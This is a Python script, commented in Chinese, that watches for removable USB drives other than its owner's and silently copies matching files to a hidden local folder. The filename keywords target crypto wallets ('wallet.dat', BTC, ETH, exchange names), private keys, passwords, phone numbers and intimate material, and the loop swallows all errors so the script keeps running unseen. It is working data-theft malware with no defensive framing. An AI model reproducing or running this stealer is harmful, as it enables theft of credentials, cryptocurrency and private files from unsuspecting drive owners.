# -*- coding: UTF-8 -*-
import os
import shutil
import psutil
import time


while True:
    try:
        b =[]
        aa=["wallet.dat","密码","BTC","ETH","EOS","账户","号码","重要",
            "私人","隐私","我的","私钥","加密","隐私",
            "炮友","女友","男友","亲爱","国产","火币","OKEX","币安","巨乳","电话",]
        c=0
        kk=0
        a=""
        ss=0
        # 判断是否插入U盘
        while True:
            disk = psutil.disk_partitions()
            for i in disk:
                k = i.opts.split(",")
                if k[1] == "removable":
                    a = i.device
                    break
            if a == "":
                time.sleep(2)
                continue
            else:
                pass
            # 判断是否是自己的U盘
            is_f = os.path.exists(os.path.join(a, 'kai.yue'))
            if is_f == True:
                a = ""
                kk = 0
                time.sleep(2)
                print('这是自己的U盘')
                continue
            else:
                break

        # 判断是否存在目录
        _TIME = time.strftime("%Y-%m-%d--%H", time.localtime())
        f_3 = "D:\\一梦千秋\\"
        f_4 = os.path.join(f_3,_TIME)
        is_yes = os.path.exists(f_4)
        if is_yes == True:
            pass
        else:
            os.makedirs(f_4)

        # 执行具体的命令
        aa1 = os.walk(a)
        for i in aa1:
            for j in i[2]:
                for k1 in aa:
                    if k1 in j and i[0] != f_4:
                        shutil.copy(os.path.join(i[0],j), f_4)
                        c += 1
        print("找到{0}个匹配的文件".format(c))
        time.sleep(5)
    except:
        pass










































